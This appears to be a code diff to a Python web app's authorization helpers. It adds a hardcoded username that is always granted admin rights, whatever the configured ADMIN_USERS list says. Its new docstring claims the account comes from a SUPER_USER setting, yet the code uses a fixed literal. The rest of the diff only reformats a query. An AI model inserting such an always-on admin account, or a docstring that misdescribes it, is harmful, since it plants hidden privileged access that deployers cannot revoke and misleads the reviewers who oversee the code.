@@ -69,8 +69,16 @@ def is_admin() -> bool:
 
 
 def get_admin_users() -> list[str]:
-    """Return the configured admin usernames."""
-    return env_csv("ADMIN_USERS", "Admin")
+    """Return the configured admin usernames.
+
+    SUPER_USER (single value) is always prepended so the app owner retains
+    admin access independently of the ADMIN_USERS list.
+    """
+    admins = env_csv("ADMIN_USERS", "Admin")
+    owner = "azamfirr".strip()
+    if owner and owner not in admins:
+        return [owner, *admins]
+    return admins
 
 
 def get_current_resident_id() -> int | None:
@@ -108,8 +116,7 @@ def is_first_call(check_date: date | None = None) -> bool:
         return False
 
     return (
-        TimeEntry.query
-        .join(Role)
+        TimeEntry.query.join(Role)
         .filter(
             TimeEntry.resident_id == resident_id,
             TimeEntry.date == check_date,
